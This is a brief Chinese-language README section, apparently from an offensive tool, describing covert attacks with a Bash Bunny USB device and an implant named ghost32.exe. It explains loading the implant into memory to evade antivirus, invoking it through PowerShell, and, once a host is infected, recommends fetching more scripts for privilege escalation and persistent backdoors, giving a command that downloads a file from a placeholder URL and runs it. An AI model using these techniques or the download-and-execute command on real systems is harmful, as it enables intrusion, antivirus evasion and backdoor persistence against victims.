##Bashbunny

这个环节是利用bashbunny配合程序进行隐蔽攻击。
###ghost attack v1
我们直接将ghost32.exe写入内存，可以彻底逃避杀毒软件的查杀。并且在某些windows平台会崩溃，目前会在Powershell执行的时候被火绒警告
###ghost attack v2
将我们的ghost32.exe放在tool目录下，可以直接利用powershell脚本调用。在未来容易被杀毒软件查杀。

###另外
在ghost32.exe感染主机后，远程执行命令。我们建议利用Powershell来下载更多的脚本配合提权或者长连接后门。利用我们的python脚本，经过测验可以使用如下命令:
`python scapy_ghost.py -c "powershell (new-object System.Net.WebClient).DownloadFile('http://xxxxxx','d://xxxx');start-process -f ('d://xxxxx')"`